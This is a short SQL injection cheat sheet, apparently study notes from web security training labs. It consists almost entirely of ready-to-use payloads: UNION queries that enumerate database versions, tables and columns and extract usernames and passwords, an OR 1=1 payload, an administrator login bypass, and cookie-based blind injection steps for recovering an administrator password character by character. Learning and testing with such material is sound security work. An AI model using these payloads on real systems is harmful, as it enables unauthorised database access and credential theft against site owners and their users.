## SQLi Cheatsheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

## Version Enumeration
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- (Oracle)
'+UNION+SELECT+@@version,+NULL# (Windows & MSSql)
```

## Column Count Enumeration
```
'+UNION+SELECT+NULL,NULL-- (non oracle)
'+UNION+SELECT+'a','b'+FROM+dual-- (oracle)
```

## Table Enumeration
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- (non oracle)
'+UNION+SELECT+table_name,NULL+FROM+all_tables-- (oracle)
```

## Column Details Enumeration
```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- (non oracle)
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- (oracle)
```

## Retrieve Data
```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- (non oracle)
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- (oracle)
```

## General Payloads
```
'+OR+1=1--

```

## Auth Bypass
```
administrator'--
```

## Blind SQLi to guess passwords
Find a potentially vulnerable cookie in a BURP response. The page difference may be minimal, so check the site for text that only appears if a statement is true/false.
Cookie Example:
TrackingId=xyz' AND '1'='1 (true)
TrackingId=xyz' AND '1'='2 (false)

Next you will need to guess the table name and potential user names. Again, we attempt to verify the information with a true/false statement that confirms our guess:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

Now we need to guess the password length. The following statement should return as true and enables you to increase the length until you find the limit:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

Next you will need to identify each letter using BURP intruder. The letters can be enumerated using the following query:
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
etc.
